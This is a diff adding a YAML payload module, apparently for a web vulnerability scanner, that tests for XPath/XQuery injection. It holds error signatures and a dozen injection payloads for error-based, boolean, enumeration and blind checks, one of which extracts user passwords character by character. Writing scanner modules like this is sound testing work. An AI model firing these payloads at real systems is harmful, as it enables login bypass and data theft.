@@ -1,0 +1,36 @@
+name: xpath
+description: XPath / XQuery Injection — quebra de expressão e erro
+detectors: [signature, diff]
+diff_len_ratio: 0.30
+
+transforms:
+  - raw
+  - url
+  - case_random
+
+signatures:
+  - "XPathException"
+  - "MS\\.Internal\\.Xml"
+  - "Unknown error in XPath"
+  - "org\\.apache\\.xpath"
+  - "A closing bracket expected"
+  - "SimpleXMLElement::xpath"
+  - "xmlXPathEval"
+  - "Invalid expression|Invalid predicate"
+  - "XPath error|XPathEvalError"
+  - "Warning: xpath"
+  - "SyntaxError:.*XPath"
+
+payloads:
+  - { value: "'", tags: [error] }
+  - { value: "\"", tags: [error] }
+  - { value: "']", tags: [error] }
+  - { value: "' or '1'='1", tags: [boolean] }
+  - { value: "\" or \"1\"=\"1", tags: [boolean] }
+  - { value: "' or 1=1 or ''='", tags: [boolean] }
+  - { value: "'] | //* | //['", tags: [enum] }
+  - { value: "count(//*)", tags: [enum] }
+  - { value: "' or name()='username' or 'a'='b", tags: [enum] }
+  - { value: "x'] | //user/*['", tags: [enum] }
+  - { value: "'+substring(//user[1]/password,1,1)+'", tags: [blind] }
+  - { value: "' and '1'='2", tags: [boolean, false] }
